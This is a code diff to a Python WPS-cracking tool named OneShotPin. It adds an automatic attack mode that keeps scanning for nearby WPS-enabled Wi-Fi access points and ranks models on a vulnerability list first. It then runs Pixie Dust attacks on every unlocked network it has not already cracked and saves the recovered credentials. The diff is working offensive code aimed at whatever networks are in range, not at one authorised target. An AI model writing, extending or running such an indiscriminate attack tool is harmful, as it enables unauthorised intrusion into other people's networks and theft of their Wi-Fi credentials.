@@ -1121,6 +1121,76 @@ class WiFiScanner:
             except Exception:
                 print('Invalid number')
 
+def auto_attack_mode(args):
+    """Handles the auto-attack logic."""
+    stored_networks = set()
+    try:
+        with open(os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv', 'r', newline='', encoding='utf-8', errors='replace') as file:
+            csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
+            next(csvReader)  # Skip header
+            for row in csvReader:
+                stored_networks.add(row[1]) # Add BSSID to the set
+    except FileNotFoundError:
+        pass
+
+    while True:
+        try:
+            print("[*] Scanning for networks...")
+            try:
+                with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                    vuln_list = file.read().splitlines()
+            except FileNotFoundError:
+                vuln_list = []
+            scanner = WiFiScanner(args.interface, vuln_list)
+            networks = scanner.iw_scanner()
+
+            if not networks:
+                print("[-] No WPS networks found. Retrying in 30 seconds...")
+                time.sleep(30)
+                continue
+
+            # Prioritize networks: green, then white
+            green_targets = []
+            white_targets = []
+
+            for _, network in networks.items():
+                model = '{} {}'.format(network['Model'], network['Model number'])
+                if network['BSSID'] in stored_networks:
+                    continue
+                if network['WPS locked']:
+                    continue
+                
+                target_info = {'bssid': network['BSSID'], 'essid': network.get('ESSID', 'HIDDEN')}
+
+                if model in vuln_list:
+                    green_targets.append(target_info)
+                else:
+                    white_targets.append(target_info)
+
+            prioritized_targets = green_targets + white_targets
+            
+            if not prioritized_targets:
+                print("[i] No new networks to attack. Waiting for new networks to appear...")
+                time.sleep(30)
+                continue
+
+            for target in prioritized_targets:
+                print(f"[*] Attacking {target['essid']} ({target['bssid']})")
+                companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'])
+                if companion.single_connection(bssid=target['bssid'], pixiemode=True, showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force):
+                    print(f"[+] Successfully attacked {target['essid']}. Credentials saved.")
+                    stored_networks.add(target['bssid'])
+                else:
+                    print(f"[-] Attack on {target['essid']} failed.")
+                companion.cleanup()
+                time.sleep(5) # Brief pause between attacks
+
+        except KeyboardInterrupt:
+            print("\n[!] Auto-attack mode stopped by user.")
+            break
+        except Exception as e:
+            print(f"[!] An error occurred: {e}. Retrying...")
+            time.sleep(10)
 
 def ifaceUp(iface, down=False):
     if down:
@@ -1181,7 +1251,12 @@ if __name__ == '__main__':
         description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
         epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
         )
-
+    
+    parser.add_argument(
+        '-A', '--auto-attack',
+        action='store_true',
+        help='Automatically attack all vulnerable networks'
+        )
     parser.add_argument(
         '-i', '--interface',
         type=str,
@@ -1285,44 +1360,47 @@ if __name__ == '__main__':
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
-    while True:
-        try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose)
-            if args.pbc:
-                companion.single_connection(pbc_mode=True)
-            else:
-                if not args.bssid:
-                    try:
-                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                            vuln_list = file.read().splitlines()
-                    except FileNotFoundError:
-                        vuln_list = []
-                    scanner = WiFiScanner(args.interface, vuln_list)
-                    if not args.loop:
-                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
-                    args.bssid = scanner.prompt_network()
+    if args.auto_attack:
+        auto_attack_mode(args)
+    else:
+        while True:
+            try:
+                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                if args.pbc:
+                    companion.single_connection(pbc_mode=True)
+                else:
+                    if not args.bssid:
+                        try:
+                            with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                                vuln_list = file.read().splitlines()
+                        except FileNotFoundError:
+                            vuln_list = []
+                        scanner = WiFiScanner(args.interface, vuln_list)
+                        if not args.loop:
+                            print('[*] BSSID not specified (--bssid) — scanning for available networks')
+                        args.bssid = scanner.prompt_network()
 
-                if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                    if args.bruteforce:
-                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                    else:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
-                                                    args.show_pixie_cmd, args.pixie_force)
-            if not args.loop:
-                break
-            else:
-                args.bssid = None
-        except KeyboardInterrupt:
-            if args.loop:
-                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting…")
+                    if args.bssid:
+                        companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                        if args.bruteforce:
+                            companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                        else:
+                            companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
+                                                        args.show_pixie_cmd, args.pixie_force)
+                if not args.loop:
                     break
                 else:
                     args.bssid = None
-            else:
-                print("\nAborting…")
-                break
+            except KeyboardInterrupt:
+                if args.loop:
+                    if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
+                        print("Aborting…")
+                        break
+                    else:
+                        args.bssid = None
+                else:
+                    print("\nAborting…")
+                    break
 
     if args.iface_down:
         ifaceUp(args.interface, down=True)
